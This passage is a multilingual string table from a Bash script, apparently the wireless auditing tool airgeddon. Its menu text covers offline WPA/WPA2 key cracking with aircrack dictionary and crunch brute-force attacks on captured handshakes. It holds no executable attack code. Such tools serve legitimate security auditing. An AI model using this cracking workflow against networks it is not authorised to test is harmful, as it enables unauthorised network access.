	arr["PORTUGUESE",166]="Quer manter sua interface em modo monitor ao sair do script? ${normal_color}[y/n]"
	arr["RUSSIAN",166]="Вы хотите сохранить режим монитора вашей карты при выходе? ${normal_color}[y/n]"
	arr["GREEK",166]="Θέλετε να παραμείνει η κάρτα σε κατάσταση παρακολούθησης κατά την έξοδο; ${normal_color}[y/n]"

	arr["ENGLISH",167]="Putting your interface in managed mode"
	arr["SPANISH",167]="Poniendo interfaz en modo managed"
	arr["FRENCH",167]="L'interface est en train de passer en mode managed"
	arr["CATALAN",167]="Configurant la interfície en mode managed"
	arr["PORTUGUESE",167]="Colocando interface de modo managed"
	arr["RUSSIAN",167]="Перевод вашего монитора в управляемый режим"
	arr["GREEK",167]="Η διεπαφή μπαίνει σε ετερόκλητη κατάσταση"

	arr["ENGLISH",168]="Launching previously killed processes"
	arr["SPANISH",168]="Arrancando procesos cerrados anteriormente"
	arr["FRENCH",168]="Lancement des processus précédemment tués"
	arr["CATALAN",168]="Llançant processos tancats anteriorment"
	arr["PORTUGUESE",168]="Processos de inicialização previamente fechados"
	arr["RUSSIAN",168]="Запуск ранее убитых процессов"
	arr["GREEK",168]="Γίνεται έναρξη των προηγούμενων σταματημένων διεργασιών"

	arr["ENGLISH",169]="6.  Offline WPA/WPA2 decrypt menu"
	arr["SPANISH",169]="6.  Menú de desencriptado WPA/WPA2 offline"
	arr["FRENCH",169]="6.  Menu crack WPA/WPA2 offline"
	arr["CATALAN",169]="6.  Menú per desxifrar WPA/WPA2 offline"
	arr["PORTUGUESE",169]="6.  Menu de descriptografia WPA/WPA2 offline"
	arr["RUSSIAN",169]="6.  Меню офлайн расшифровки WPA/WPA2"
	arr["GREEK",169]="6.  Μενού offline αποκρυπτογράφησης WPA/WPA2"

	arr["ENGLISH",170]="Offline WPA/WPA2 decrypt menu"
	arr["SPANISH",170]="Menú de desencriptado WPA/WPA2 offline"
	arr["FRENCH",170]="Menu crack WPA/WPA2 offline"
	arr["CATALAN",170]="Menú per desxifrar WPA/WPA2 offline"
	arr["PORTUGUESE",170]="Menu de descriptografia WPA/WPA2 offline"
	arr["RUSSIAN",170]="Меню офлайн расшифровки WPA/WPA2"
	arr["GREEK",170]="Μενού offline αποκρυπτογράφησης WPA/WPA2"

	arr["ENGLISH",171]="The key decrypt process is performed offline on a previously captured file"
	arr["SPANISH",171]="El proceso de desencriptado de las claves se realiza de manera offline sobre un fichero capturado previamente"
	arr["FRENCH",171]="Le crack de la clef s'effectue offline en utilisant le fichier capturé antérieurement"
	arr["CATALAN",171]="El procés de desencriptació de les claus es realitza de manera offline sobre un fitxer capturat prèviament"
	arr["PORTUGUESE",171]="O processo de descodificação é realizada de modo offline em um arquivo previamente capturado"
	arr["RUSSIAN",171]="Процесс расшифровки ключа выполняется офлайн на ранее захваченном файле"
	arr["GREEK",171]="Η διεργασία αποκρυπτογράφησης κλειδιού έχει εκτελεστεί offline σε προηγούμενο αρχείο καταγραφής"

	arr["ENGLISH",172]="1.  (aircrack) Dictionary attack against capture file"
	arr["SPANISH",172]="1.  (aircrack) Ataque de diccionario sobre fichero de captura"
	arr["FRENCH",172]="1.  (aircrack) Attaque de dictionnaire en utilisant le fichier de capture"
	arr["CATALAN",172]="1.  (aircrack) Atac de diccionari sobre fitxer de captura"
	arr["PORTUGUESE",172]="1.  (aircrack) Ataque de diccionario sobre arquivo de captura"
	arr["RUSSIAN",172]="1.  (aircrack) Атака по словарю в отношении захваченного файла"
	arr["GREEK",172]="1.  (aircrack) Επίθεση με χρήση λεξικού σε αρχείο καταγραφής"

	arr["ENGLISH",173]="Selected capture file: ${pink_color}${enteredpath}${normal_color}"
	arr["SPANISH",173]="Fichero de captura seleccionado: ${pink_color}${enteredpath}${normal_color}"
	arr["FRENCH",173]="Fichier de capture sélectionné: ${pink_color}${enteredpath}${normal_color}"
	arr["CATALAN",173]="Fitxer de captura seleccionat: ${pink_color}${enteredpath}${normal_color}"
	arr["PORTUGUESE",173]="Seleccionado arquivo de captura: ${pink_color}${enteredpath}${normal_color}"
	arr["RUSSIAN",173]="Выбранный файл захвата: ${pink_color}${enteredpath}${normal_color}"
	arr["GREEK",173]="Επιλεγμένο αρχείο καταγραφής: ${pink_color}${enteredpath}${normal_color}"

	arr["ENGLISH",174]="6.  Return to main menu"
	arr["SPANISH",174]="6.  Volver al menú principal"
	arr["FRENCH",174]="6.  Retourner au menu principal"
	arr["CATALAN",174]="6.  Tornar al menú principal"
	arr["PORTUGUESE",174]="6.  Voltar para o menu principal"
	arr["RUSSIAN",174]="6.  Возврат в главное меню"
	arr["GREEK",174]="6.  Επιστροφή στο αρχικό μενού"

	arr["ENGLISH",175]="2.  (aircrack + crunch) Bruteforce attack against capture file"
	arr["SPANISH",175]="2.  (aircrack + crunch) Ataque de fuerza bruta sobre fichero de captura"
	arr["FRENCH",175]="2.  (aircrack + crunch) Attaque de force brute en utilisant le fichier de capture"
	arr["CATALAN",175]="2.  (aircrack + crunch) Atac de força bruta sobre fitxer de captura"
	arr["PORTUGUESE",175]="2.  (aircrack + crunch) Ataque de força bruta em arquivo de captura"
	arr["RUSSIAN",175]="2.  (aircrack + crunch) Атака методом грубой силы в отношении захваченного файла"
	arr["GREEK",175]="2.  (aircrack + crunch) Επίθεση ωμής βίας σε αρχείο καταγραφής"

	arr["ENGLISH",176]="aircrack CPU, non GPU attacks"
	arr["SPANISH",176]="ataques aircrack CPU, no GPU"
	arr["FRENCH",176]="attaques aircrack CPU, pas GPU"
	arr["CATALAN",176]="atacs aircrack CPU, no GPU"
	arr["PORTUGUESE",176]="ataques aircrack CPU, não GPU"
	arr["RUSSIAN",176]="aircrack атаки с использованием процессора, а не видеокарты"
	arr["GREEK",176]="επιθέσεις aircrack CPU, όχι GPU"

	arr["ENGLISH",177]="Selected captured file: ${pink_color}None${normal_color}"
	arr["SPANISH",177]="Fichero capturado seleccionado: ${pink_color}Ninguno${normal_color}"
	arr["FRENCH",177]="Fichier de capture sélectionné: ${pink_color}Aucun${normal_color}"
	arr["CATALAN",177]="Fitxer capturat seleccionat: ${pink_color}Ningú${normal_color}"
	arr["PORTUGUESE",177]="Selecione o arquivo capturado: ${pink_color}Nenhum${normal_color}"
	arr["RUSSIAN",177]="Выбран файл захвата: ${pink_color}Нет${normal_color}"
	arr["GREEK",177]="Επιλεγμένο αρχείο καταγραφής: ${pink_color}Κανένα${normal_color}"

	arr["ENGLISH",178]="To decrypt the key of a WPA/WPA2 network, the capture file must contain a Handshake"
	arr["SPANISH",178]="Para desencriptar la clave de una red WPA/WPA2, el fichero de captura debe contener un Handshake"
	arr["FRENCH",178]="Pour cracker la clé d'un réseau WPA/WPA2 le fichier de capture doit contenir un Handshake"
	arr["CATALAN",178]="Per desencriptar la clau d'una xarxa WPA/WPA2 el fitxer de captura ha de contenir un Handshake"
	arr["PORTUGUESE",178]="Para decifrar a senha de rede WPA/WPA2, o arquivo de captura deve conter um Handshake"
	arr["RUSSIAN",178]="Для расшифровки ключа сетей WPA/WPA2, файл захвата должен содержать четырёхэтапное рукопожатие"
	arr["GREEK",178]="Για να αποκρυπτογραφήσετε το κλειδί ενός WPA/WPA2 δικτύου, το αρχείο καταγραφής πρέπει να περιέχει μία Χειραψία"

	arr["ENGLISH",179]="Decrypting by bruteforce, it could pass hours, days, weeks or even months to take it depending on the complexity of the password and your processing speed"
	arr["SPANISH",179]="Desencriptando por fuerza bruta, podrían pasar horas, días, semanas o incluso meses hasta conseguirlo dependiendo de la complejidad de la contraseña y de tu velocidad de proceso"
	arr["FRENCH",179]="Le crack de la clef par attaque de type brute force peut prendre des heures, des jours, des semaines ou même des mois en fonction de la complexité de la clef et de la puissance de calcul de votre matériel"
	arr["CATALAN",179]="Desencriptant per força bruta, podrien passar hores, dies, setmanes o fins i tot mesos fins a aconseguir-ho depenent de la complexitat de la contrasenya i de la teva velocitat de procés"
	arr["PORTUGUESE",179]="Descriptografar com força bruta pode levar horas, dias, semanas ou mesmo meses dependendo da complexidade de sua senha e velocidade de processamento"
	arr["RUSSIAN",179]="Расшифровка грубой силой может занять часы, дни, недели или даже месяцы в зависимости от сложности пароля и вашей скорости обработки"
	arr["GREEK",179]="Αποκρυπτογραφώντας με χρήση ωμής βίας, μπορεί να περάσουν ώρες, μέρες, εβδομάδες ή ακόμη και μήνες για να το αποκτήσετε έχοντας υπόψιν την πολυπλοκότητα του κωδικού πρόσβασης και την ταχύτητα του επεξεργαστή"

	arr["ENGLISH",180]="Enter the path of a dictionary file :"
	arr["SPANISH",180]="Introduce la ruta de un fichero de diccionario :"
	arr["FRENCH",180]="Saisissez un chemin vers un dictionnaire d'attaque :"
	arr["CATALAN",180]="Introdueix la ruta d'un fitxer de diccionari :"
	arr["PORTUGUESE",180]="Digite o caminho de um arquivo de dicionário :"
	arr["RUSSIAN",180]="Введите путь до файла словаря :"
	arr["GREEK",180]="Εισάγετε το μονοπάτι ενός λεξικού :"

	arr["ENGLISH",181]="The path to the dictionary file is valid. Script can continue..."
	arr["SPANISH",181]="La ruta al fichero de diccionario es válida. El script puede continuar..."
	arr["FRENCH",181]="Le chemin vers le fichier dictionnaire est valide. Le script peut continuer..."
	arr["CATALAN",181]="La ruta cap al fitxer de diccionari és vàlida. El script pot continuar..."
	arr["PORTUGUESE",181]="O caminho para o arquivo de dicionário é válido. O script pode continuar..."
	arr["RUSSIAN",181]="Путь до файла словаря правильный. Скрипт может продолжить..."
	arr["GREEK",181]="Το μονοπάτι για το λεξικό είναι έγκυρο. Το script μπορεί να συνεχίσει..."

	arr["ENGLISH",182]="Selected dictionary file: ${pink_color}${DICTIONARY}${normal_color}"
	arr["SPANISH",182]="Fichero de diccionario seleccionado: ${pink_color}${DICTIONARY}${normal_color}"
	arr["FRENCH",182]="Fichier dictionnaire sélectionné: ${pink_color}${DICTIONARY}${normal_color}"
	arr["CATALAN",182]="Fitxer de diccionari seleccionat: ${pink_color}${DICTIONARY}${normal_color}"
	arr["PORTUGUESE",182]="Dicionário seleccionado: ${pink_color}${DICTIONARY}${normal_color}"
	arr["RUSSIAN",182]="Выбранный файл словаря: ${pink_color}${DICTIONARY}${normal_color}"
	arr["GREEK",182]="Επιλεγμένο λεξικό: ${pink_color}${DICTIONARY}${normal_color}"

	arr["ENGLISH",183]="You already have selected a dictionary file during this session [${normal_color}${DICTIONARY}${blue_color}]"
	arr["SPANISH",183]="Ya tienes seleccionado un fichero de diccionario en esta sesión [${normal_color}${DICTIONARY}${blue_color}]"
	arr["FRENCH",183]="Vous avez déjà sélectionné un fichier dictionnaire pour cette session ${normal_color}${DICTIONARY}${blue_color}]"
	arr["CATALAN",183]="Ja tens seleccionat un fitxer de diccionari en aquesta sessió [${normal_color}${DICTIONARY}${blue_color}]"
	arr["PORTUGUESE",183]="Você selecionou um arquivo de dicionário nesta sessão [${normal_color}${DICTIONARY}${blue_color}]"
	arr["RUSSIAN",183]="Во время этой сессии вы выбрали файл словаря [${normal_color}${DICTIONARY}${blue_color}]"
	arr["GREEK",183]="Έχετε ήδη επιλέξει λεξικό κατά τη διάρκεια της συνεδρίας [${normal_color}${DICTIONARY}${blue_color}]"

	arr["ENGLISH",184]="Do you want to use this already selected dictionary file? ${normal_color}[y/n]"
	arr["SPANISH",184]="¿Quieres utilizar este fichero de diccionario ya seleccionado? ${normal_color}[y/n]"
	arr["FRENCH",184]="Souhaitez vous utiliser le dictionnaire déjà sélectionné? ${normal_color}[y/n]"
	arr["CATALAN",184]="¿Vols fer servir aquest fitxer de diccionari ja seleccionat? ${normal_color}[y/n]"
	arr["PORTUGUESE",184]="Você quer usar esse arquivo de dicionário já seleccionada? ${normal_color}[y/n]"
	arr["RUSSIAN",184]="Вы хотите использовать этот уже выбранный файл словаря? ${normal_color}[y/n]"
	arr["GREEK",184]="Θέλετε να χρησιμοποιήσετε το ήδη επιλεγμένο λεξικό; ${normal_color}[y/n]"

	arr["ENGLISH",185]="Selected BSSID: ${pink_color}None${normal_color}"
	arr["SPANISH",185]="BSSID seleccionado: ${pink_color}Ninguno${normal_color}"
	arr["FRENCH",185]="BSSID sélectionné: ${pink_color}Aucun${normal_color}"
	arr["CATALAN",185]="BSSID seleccionat: ${pink_color}Ningú${normal_color}"
	arr["PORTUGUESE",185]="BSSID selecionado: ${pink_color}Nenhum${normal_color}"
	arr["RUSSIAN",185]="Выбранная BSSID: ${pink_color}Нет${normal_color}"
	arr["GREEK",185]="Επιλεγμένο BSSID: ${pink_color}Κανένα${normal_color}"

	arr["ENGLISH",186]="You already have selected a capture file during this session [${normal_color}${enteredpath}${blue_color}]"
	arr["SPANISH",186]="Ya tienes seleccionado un fichero de captura en esta sesión [${normal_color}${enteredpath}${blue_color}]"
	arr["FRENCH",186]="Vous avez déjà sélectionné un fichier de capture pour cette session ${normal_color}${enteredpath}${blue_color}]"
	arr["CATALAN",186]="Ja tens seleccionat un fitxer de captura en aquesta sessió [${normal_color}${enteredpath}${blue_color}]"
	arr["PORTUGUESE",186]="Você selecionou um arquivo de captura nesta sessão [${normal_color}${enteredpath}${blue_color}]"
	arr["RUSSIAN",186]="Вы уже выбрали файл захвата во время этой сессии [${normal_color}${enteredpath}${blue_color}]"
	arr["GREEK",186]="Έχετε ήδη επιλέξει αρχείο καταγραφής κατά τη διάρκεια της συνεδρίας [${normal_color}${enteredpath}${blue_color}]"

	arr["ENGLISH",187]="Do you want to use this already selected capture file? ${normal_color}[y/n]"
	arr["SPANISH",187]="¿Quieres utilizar este fichero de captura ya seleccionado? ${normal_color}[y/n]"
	arr["FRENCH",187]="Souhaitez vous utiliser le fichier de capture déjà sélectionné? ${normal_color}[y/n]"
	arr["CATALAN",187]="¿Vols fer servir aquest fitxer de captura ja seleccionat? ${normal_color}[y/n]"
	arr["PORTUGUESE",187]="Você quer usar esse arquivo de captura selecionado? ${normal_color}[y/n]"
	arr["RUSSIAN",187]="Вы хотите использовать этот уже выбранный файл захвата? ${normal_color}[y/n]"
	arr["GREEK",187]="Θέλετε να χρησιμοποιήσετε το ήδη επιλεγμένο αρχείο καταγραφής; ${normal_color}[y/n]"

	arr["ENGLISH",188]="Enter the path of a captured file :"
	arr["SPANISH",188]="Introduce la ruta de un fichero de captura :"
	arr["FRENCH",188]="Entrez le chemin vers un fichier de capture :"
	arr["CATALAN",188]="Introdueix la ruta d'un fitxer de captura :"
	arr["PORTUGUESE",188]="Digite o caminho para um arquivo de captura :"
	arr["RUSSIAN",188]="Введите путь файла захвата :"
	arr["GREEK",188]="Εισάγετε το μονοπάτι για ένα αρχείο καταγραφής :"

	arr["ENGLISH",189]="The path to the capture file is valid. Script can continue..."
	arr["SPANISH",189]="La ruta al fichero de captura es válida. El script puede continuar..."
	arr["FRENCH",189]="Le chemin du fichier de capture est valide. Le script peut continuer..."
	arr["CATALAN",189]="La ruta al fitxer de captura és vàlida. El script pot continuar..."
	arr["PORTUGUESE",189]="O caminho para o arquivo de captura é válido. O script pode continuar..."
	arr["RUSSIAN",189]="Путь до файла захвата верен. Скрипт может продолжать..."
	arr["GREEK",189]="Το μονοπάτι για το αρχείο καταγραφής είναι έγκυρο. Το script μπορεί να συνεχίσει..."

	arr["ENGLISH",190]="Starting decrypt. When started, press [Ctrl+C] to stop..."
	arr["SPANISH",190]="Comenzando desencriptado. Una vez empezado, pulse [Ctrl+C] para pararlo..."
	arr["FRENCH",190]="Lancement du crack. Pressez [Ctrl+C] pour l'arrêter..."
	arr["CATALAN",190]="Començant el desencriptat. Un cop començat, premeu [Ctrl+C] per aturar-lo..."
	arr["PORTUGUESE",190]="Começando a descriptografar. Uma vez iniciado, pressione [Ctrl+C] para parar..."
	arr["RUSSIAN",190]="Начало расшифровки. После запуска, нажмите [Ctrl+C] для остановки..."
	arr["GREEK",190]="Γίνεται έναρξη αποκρυπτογράφησης. Όταν ξεκινήσει, πατήστε [Ctrl+C] για να σταματήσει..."

	arr["ENGLISH",191]="Capture file you selected is an unsupported file format (not a pcap or IVs file)"
	arr["SPANISH",191]="El fichero de captura que has seleccionado tiene un formato no soportado (no es un fichero pcap o de IVs)"
	arr["FRENCH",191]="Le fichier de capture que vous avez sélectionné est dans un format non supporté (ce n'est pas un fichier pcap ou IVs)"
	arr["CATALAN",191]="El fitxer de captura que has seleccionat té un format no suportat (no és un fitxer pcap o de IVs)"
	arr["PORTUGUESE",191]="O arquivo de captura selecionado tem um invalido (não é um arquivo pcap ou IVs)"
	arr["RUSSIAN",191]="Файл захвата, который вы выбрали, в неподдерживаемом формате (это не файл pcap или IVs)"
	arr["GREEK",191]="Η επέκταση του αρχείου καταγραφής που έχετε επιλέξει δεν υποστηρίζεται (δεν είναι pcap ούτε IVs αρχείο)"

	arr["ENGLISH",192]="You already have selected a BSSID during this session and is present in capture file [${normal_color}${bssid}${blue_color}]"
	arr["SPANISH",192]="Ya tienes seleccionado un BSSID en esta sesión y está presente en el fichero de captura [${normal_color}${bssid}${blue_color}]"
	arr["FRENCH",192]="Vous avez déjà sélectionné un BSSID pour la session en cours et est présent dans le fichier de capture ${normal_color}${bssid}${blue_color}]"
	arr["CATALAN",192]="Ja tens seleccionat un BSSID en aquesta sessió i està present en el fitxer de captura [${normal_color}${bssid}${blue_color}]"
	arr["PORTUGUESE",192]="Seleccionou um BSSID nesta sessão e está presente no arquivo de captura [${normal_color}${bssid}${blue_color}]"
	arr["RUSSIAN",192]="У вас уже есть выбранная во время этой сессии BSSID и она присутствует в файле захвата [${normal_color}${bssid}${blue_color}]"
	arr["GREEK",192]="Έχετε ήδη επιλέξει BSSID κατά τη διάρκεια της συνεδρίας και βρίσκεται στο αρχείο καταγραφής [${normal_color}${bssid}${blue_color}]"

	arr["ENGLISH",193]="Do you want to use this already selected BSSID? ${normal_color}[y/n]"
	arr["SPANISH",193]="¿Quieres utilizar este BSSID ya seleccionado? ${normal_color}[y/n]"
	arr["FRENCH",193]="Souhaitez vous utiliser le BSSID déjà sélectionné? ${normal_color}[y/n]"
	arr["CATALAN",193]="¿Vols fer servir aquest BSSID ja seleccionat? ${normal_color}[y/n]"
	arr["PORTUGUESE",193]="Você quer usar este BSSID já seleccionada? ${normal_color}[y/n]"
	arr["RUSSIAN",193]="Вы хотите использовать эту уже выбранную BSSID? ${normal_color}[y/n]"
	arr["GREEK",193]="Θέλετε να χρησιμοποιήσετε το ήδη επιλεγμένο BSSID; ${normal_color}[y/n]"

	arr["ENGLISH",194]="Enter the minimum length of the key to decrypt (8-63) :"
	arr["SPANISH",194]="Introduce la longitud mínima de la clave a desencriptar (8-63) :"
	arr["FRENCH",194]="Entrez la longueur minimale de la clef à cracker (8-63) :"
	arr["CATALAN",194]="Introdueix la longitud mínima de la clau a desxifrar (8-63) :"
	arr["PORTUGUESE",194]="Digite o comprimento mínimo da senha para descriptografa (8-63) :"
	arr["RUSSIAN",194]="Введите минимальную длину ключа для расшифровки (8-63) :"
	arr["GREEK",194]="Εισάγετε το ελάχιστο μήκος κλειδιού για αποκρυπτογράφηση (8-63) :"

	arr["ENGLISH",195]="Enter the maximum length of the key to decrypt (${minlength}-63) :"
	arr["SPANISH",195]="Introduce la longitud máxima de la clave a desencriptar (${minlength}-63) :"
	arr["FRENCH",195]="Entrez la longueur maximale de la clef à cracker (${minlength}-63) :"
	arr["CATALAN",195]="Introdueix la longitud màxima de la clau a desxifrar (${minlength}-63) :"
	arr["PORTUGUESE",195]="Digite o comprimento máximo da senha para descriptografar (${minlength}-63) :"
	arr["RUSSIAN",195]="Введите максимальную длину ключа для расшифровки (${minlength}-63) :"
	arr["GREEK",195]="Εισάγετε το μέγιστο μήκος κλειδιού για αποκρυπτογράφηση (${minlength}-63) :"

	arr["ENGLISH",196]="Select the character set to use :"
	arr["SPANISH",196]="Selecciona el juego de caracteres a utilizar :"
	arr["FRENCH",196]="Sélectionnez le jeu de caractères à utiliser :"
	arr["CATALAN",196]="Selecciona el joc de caràcters a utilitzar :"
	arr["PORTUGUESE",196]="Selecione o conjunto de caracteres a ser usado :"
	arr["RUSSIAN",196]="Выберите набор символов для использования :"
	arr["GREEK",196]="Επιλέξτε το σετ χαρακτήρων που θα χρησιμοποιηθεί :"

	arr["ENGLISH",197]="1.  Lowercase chars"
	arr["SPANISH",197]="1.  Caracteres en minúsculas"
	arr["FRENCH",197]="1.  Lettres minuscules"
	arr["CATALAN",197]="1.  Caràcters en minúscules"
	arr["PORTUGUESE",197]="1.  Caracteres minúsculos"
	arr["RUSSIAN",197]="1.  Символы нижнего регистра"
	arr["GREEK",197]="1.  Πεζά"

	arr["ENGLISH",198]="2.  Uppercase chars"
	arr["SPANISH",198]="2.  Caracteres en mayúsculas"
	arr["FRENCH",198]="2.  Lettres majuscules"
	arr["CATALAN",198]="2.  Caràcters en majúscules"
	arr["PORTUGUESE",198]="2.  Caracteres maiúsculos"
	arr["RUSSIAN",198]="2.  Символы верхнего регистра"
	arr["GREEK",198]="2.  Κεφαλαία"

	arr["ENGLISH",199]="3.  Numeric chars"
	arr["SPANISH",199]="3.  Caracteres numéricos"
	arr["FRENCH",199]="3.  Chiffres"
	arr["CATALAN",199]="3.  Caràcters numèrics"
	arr["PORTUGUESE",199]="3.  Caracteres numéricos"
	arr["RUSSIAN",199]="3.  Цифры"
	arr["GREEK",199]="3.  Αριθμοί"

	arr["ENGLISH",200]="4.  Symbol chars"
	arr["SPANISH",200]="4.  Caracteres símbolos"
	arr["FRENCH",200]="4.  Symboles"
	arr["CATALAN",200]="4.  Caràcters símbols"
	arr["PORTUGUESE",200]="4.  Símbolos"
	arr["RUSSIAN",200]="4.  Символы"
	arr["GREEK",200]="4.  Σύμβολα"

	arr["ENGLISH",201]="5.  Lowercase + uppercase chars"
	arr["SPANISH",201]="5.  Caracteres en minúsculas + mayúsculas"
	arr["FRENCH",201]="5.  Lettres minuscules + majuscules"
	arr["CATALAN",201]="5.  Caràcters en minúscules + majúscules"
	arr["PORTUGUESE",201]="5.  Caracteres minúsculos + maiúsculos"
	arr["RUSSIAN",201]="5.  Буквы верхнего + нижнего регистра"
	arr["GREEK",201]="5.  Πεζά + κεφαλαία"

	arr["ENGLISH",202]="6.  Lowercase + numeric chars"
	arr["SPANISH",202]="6.  Caracteres en minúsculas + numéricos"
	arr["FRENCH",202]="6.  Lettres minuscules + chiffres"
	arr["CATALAN",202]="6.  Caràcters en minúscules + numèrics"
	arr["PORTUGUESE",202]="6.  Caracteres minúsculos + números"
	arr["RUSSIAN",202]="6.  Буквы нижнего регистра + цифры"
	arr["GREEK",202]="6.  Πεζά + αριθμοί"

	arr["ENGLISH",203]="7.  Uppercase + numeric chars"
	arr["SPANISH",203]="7.  Caracteres en mayúsculas + numéricos"
	arr["FRENCH",203]="7.  Lettres majuscules + chiffres"
	arr["CATALAN",203]="7.  Caràcters en majúscules + numèrics"
	arr["PORTUGUESE",203]="7.  Caracteres maiúsculos + números"
	arr["RUSSIAN",203]="7.  Буквы верхнего регистра + цифры"
	arr["GREEK",203]="7.  Κεφαλαία + αριθμοί"

	arr["ENGLISH",204]="8.  Symbol + numeric chars"
	arr["SPANISH",204]="8.  Caracteres símbolos + numéricos"
	arr["FRENCH",204]="8.   Symboles + chiffres"
	arr["CATALAN",204]="8.  Caràcters símbols + numèrics"
	arr["PORTUGUESE",204]="8.  Símbolos + números"
	arr["RUSSIAN",204]="8.  Символы + цифры"
	arr["GREEK",204]="8.  Σύμβολα + αριθμοί"

	arr["ENGLISH",205]="9.  Lowercase + uppercase + numeric chars"
	arr["SPANISH",205]="9.  Caracteres en minúsculas + mayúsculas + numéricos"
	arr["FRENCH",205]="9.  Lettres minuscules et majuscules + chiffres"
	arr["CATALAN",205]="9.  Caràcters en minúscules + majúscules + numèrics"
	arr["PORTUGUESE",205]="9.  Caracteres minúsculos + maiúsculos + números"
	arr["RUSSIAN",205]="9.  Буквы нижнего регистра + верхнего регистра + цифры"
	arr["GREEK",205]="9.  Πεζά + κεφαλαία + αριθμοί"

	arr["ENGLISH",206]="10. Lowercase + uppercase + symbol chars"
	arr["SPANISH",206]="10. Caracteres en minúsculas + mayúsculas + símbolos"
	arr["FRENCH",206]="10. Lettres minuscules et majuscules + symboles"
	arr["CATALAN",206]="10. Caràcters en minúscules + majúscules + símbols"
	arr["PORTUGUESE",206]="10. Caracteres minúsculos + maiúsculos + símbolos"
	arr["RUSSIAN",206]="10. Буквы нижнего регистра + верхнего регистра + символы"
	arr["GREEK",206]="10. Πεζά + κεφαλαία + σύμβολα"

	arr["ENGLISH",207]="11. Lowercase + uppercase + numeric + symbol chars"
	arr["SPANISH",207]="11. Caracteres en minúsculas + mayúsculas + numéricos + símbolos"
	arr["FRENCH",207]="11. Lettres minuscules et majuscules + chiffres + symboles"
	arr["CATALAN",207]="11. Caràcters en minúscules + majúscules + numèrics + símbols"
	arr["PORTUGUESE",207]="11. Caracteres minúsculos + maiúsculos + números + símbolos"
	arr["RUSSIAN",207]="11. Буквы нижнего регистра + верхнего регистра + цифры + символы"
	arr["GREEK",207]="11. Πεζά + κεφαλαία + αριθμοί + σύμβολα"

	arr["ENGLISH",208]="If you choose a big charset and a long key length, the proccess could take so much time"
	arr["SPANISH",208]="Si eliges un juego de caracteres amplio y una longitud de clave grande, el proceso podría demorarse mucho tiempo"
	arr["FRENCH",208]="Si vous choisissez un jeu de caractères ample et une longitude de clef importante, le processus pourrait prendre beaucoup de temps"
	arr["CATALAN",208]="Si tries un joc de caràcters ampli i una longitud de clau gran, el procés podria demorar-se molt temps"
	arr["PORTUGUESE",208]="Se você escolher um grande conjunto de caracteres e um grande comprimento da senha, o processo pode levar um longo tempo"
	arr["RUSSIAN",208]="Если вы выберете большой набор символов и большую длинну ключа, процесс может занять очень много времени"
	arr["GREEK",208]="Αν επιλέξετε μεγάλη συμβολοσειρά και μεγάλο μήκος κλειδιού, η διεργασία θα διαρκέσει αρκετά"

	arr["ENGLISH",209]="The charset to use is : [${normal_color}${showcharset}${blue_color}]"
	arr["SPANISH",209]="El juego de caracteres elegido es : [${normal_color}${showcharset}${blue_color}]"
	arr["FRENCH",209]="Le jeu de caractères définit est : [${normal_color}${showcharset}${blue_color}]"
	arr["CATALAN",209]="El joc de caràcters escollit és : [${normal_color}${showcharset}${blue_color}]"
	arr["PORTUGUESE",209]="O conjunto de caracteres é:: [${normal_color}${showcharset}${blue_color}]"
	arr["RUSSIAN",209]="Символы для использования : [${normal_color}${showcharset}${blue_color}]"
	arr["GREEK",209]="Η συμβολοσειρά που θα χρησιμοποιηθεί είναι : [${normal_color}${showcharset}${blue_color}]"

	arr["ENGLISH",210]="The script will check for internet access looking for a newer version. Please be patient..."
	arr["SPANISH",210]="El script va a comprobar si tienes acceso a internet para ver si existe una nueva versión. Por favor ten paciencia..."
	arr["FRENCH",210]="Le script va vérifier que vous aillez accès à internet pour voir si une nouvelle version du script est disponible. Soyez patients s'il vous plaît..."
	arr["CATALAN",210]="El script va a comprovar si tens accés a internet per veure si hi ha una nova versió. Si us plau té paciència..."
	arr["PORTUGUESE",210]="O script irá verificar se você tem acesso a internet para ver se há uma nova versão. Por favor, seja paciente..."
	arr["RUSSIAN",210]="Скрипт проверит доступ в Интернет для поиска новой версии. Додождите немного..."
	arr["GREEK",210]="Το script θα ελέγξει αν έχετε πρόσβαση στο διαδίκτυο και έπειτα για νεότερη έκδοση. Παρακαλώ κάντε υπομονή..."

	arr["ENGLISH",211]="It seems you have no internet access. The script can't connect to repository. It will continue without updating..."
	arr["SPANISH",211]="Parece que no tienes conexión a internet. El script no puede conectar al repositorio. Continuará sin actualizarse..."
	arr["FRENCH",211]="Il semble que vous ne pouvez pas vous connecter à internet. Impossible dans ces conditions de pouvoir accéder aux dépôts. Le script va donc s’exécuter sans s'actualiser..."
	arr["CATALAN",211]="Sembla que no tens connexió a internet. El script no pot connectar al repositori. Continuarà sense actualitzar-se..."
	arr["PORTUGUESE",211]="Parece que você não tem acesso à internet. O script não pode conectar-se ao repositório. Ele continuará sem atualizar..."
	arr["RUSSIAN",211]="Кажется, у вас нет доступа в Интернет. Скрипт не может подключится к репозиторию. Он продолжит без обновления..."
	arr["GREEK",211]="Φαίνεται πως δεν έχετε πρόσβαση στο διαδίκτυο. Το script δεν μπορεί να συνδεθεί στο repository. Θα συνεχίσει χωρίς να έχει ενημερωθεί..."

	arr["ENGLISH",212]="The script is already in the latest version. It doesn't need to be updated"
	arr["SPANISH",212]="El script ya está en la última versión. No necesita ser actualizado"
	arr["FRENCH",212]="La dernière version du script est déjà installée. Pas de mise à jour possible"
	arr["CATALAN",212]="El script ja està en l'última versió. No necessita ser actualitzat"
	arr["PORTUGUESE",212]="O script já está na versão mais recente. Ele não necessita ser atualizado"
	arr["RUSSIAN",212]="Скрипт уже последней версии, обновление не требуется"
	arr["GREEK",212]="Το script είναι ήδη στην τελευταία έκδοση. Δεν χρειάζεται να ενημερωθεί"

	arr["ENGLISH",213]="A new version of the script exists (v${airgeddon_last_version}). It will be downloaded"
	arr["SPANISH",213]="Existe una nueva versión del script (v${airgeddon_last_version}). Será descargada"
	arr["FRENCH",213]="Une nouvelle version du script est disponible (v${airgeddon_last_version}). Lancement du téléchargement"
	arr["CATALAN",213]="Hi ha una nova versió dels script (v${airgeddon_last_version}). Serà descarregada"
	arr["PORTUGUESE",213]="Uma nova versão do script (v${airgeddon_last_version}). Download será iniciado"
	arr["RUSSIAN",213]="Существует новая версия скрипта (v${airgeddon_last_version}). Она будет загружена"
	arr["GREEK",213]="Υπάρχει νεότερη έκδοση του script (v${airgeddon_last_version}). Θα κατέβει"

	arr["ENGLISH",214]="The new version was successfully downloaded. The script will be launched again"
	arr["SPANISH",214]="La nueva versión se ha descargado con éxito. El script se lanzará de nuevo"
	arr["FRENCH",214]="Le téléchargement de la dernière version du script a réussit. Le script a été lancé à nouveau"
